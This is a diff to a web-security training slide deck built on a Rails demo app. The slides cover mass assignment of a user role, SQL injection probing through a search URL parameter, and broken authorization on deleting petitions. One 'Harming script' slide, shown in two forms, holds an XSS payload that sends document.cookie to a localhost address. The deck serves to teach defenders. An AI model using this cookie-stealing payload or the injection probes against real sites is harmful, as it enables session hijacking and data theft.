@@ -19,13 +19,15 @@
 	</form>
 
 
-!SLIDE full-page
-![http://yuml.me/7635ae77](class_diagram.png)
+!SLIDE full-page bullets incremental
+* Based on *RoR convetions* we may *infer a db model* something like:
+* ![http://yuml.me/7635ae77](class_diagram.png)
 
 
-!SLIDE
+!SLIDE bullets incremental
     @@@ html
     <select id="user_role_id" name="user[role_id]">
+* Since *user* would hold *foreign key* to *role* table
 
 
 !SLIDE full-page
@@ -36,9 +38,15 @@
 ![Here we see an admin saved screenshot ...](admin_saved.png)
 
 
-!SLIDE bullets incremental
+!SLIDE bullets incremental full-page
 ### SQL Injection ###
-* What *address* is *search* going through ...
+* Consider search raises page
+* ![Search raises](search.png)
+
+
+!SLIDE bullets incremental full-page
+### ... ###
+* Look at what *address* is the *search* going through ...
 * http://localhost:3000/raises/search?utf8=%E2%9C%93&search_raise=**1000.00**
 * *Testing the waters*
 * http://localhost:3000/raises/search?utf8=%E2%9C%93&search_raise=**1'**
@@ -60,13 +68,13 @@
 
 !SLIDE bullets incremental
 ### Broken Authorization ###
-* Parts/resouces of our application are usually restricted to different users
-* Some times logic behind access is flawed
+* *Parts/resouces* of our application are usually *restricted* to different *users*
+* Some times *logic behind* access is *flawed*
 
 
 !SLIDE bullets incremental
-* Following with last example security flaw
-* Are we able to delete someone else raise petition?
+* Following with our previous example on a security flaw
+* Are we able to *delete* someone else *raise petition*?
 
 
 !SLIDE full-page
@@ -81,7 +89,15 @@
 
 !SLIDE bullets incremental
 ### Harming script ###
-* &lt;script&gt;document.write('*&lt;img src="http://localhost:80/*' + **document.cookie** + '"* &gt;*')&lt;/script&gt;
+    @@@javascript
+    <script>
+      url = 'http://localhost:80/' + document.cookie
+      image_tag = "<img src='" + url + "'>"
+      document.write(image_tag)
+    </script>
+
+* **Note:** This script may be written in a variety of different ways
+* &lt;script&gt;document.write('&lt;img src="http://localhost:80/' + document.cookie + '" &gt;')&lt;/script&gt;
 
 
 !SLIDE full-page
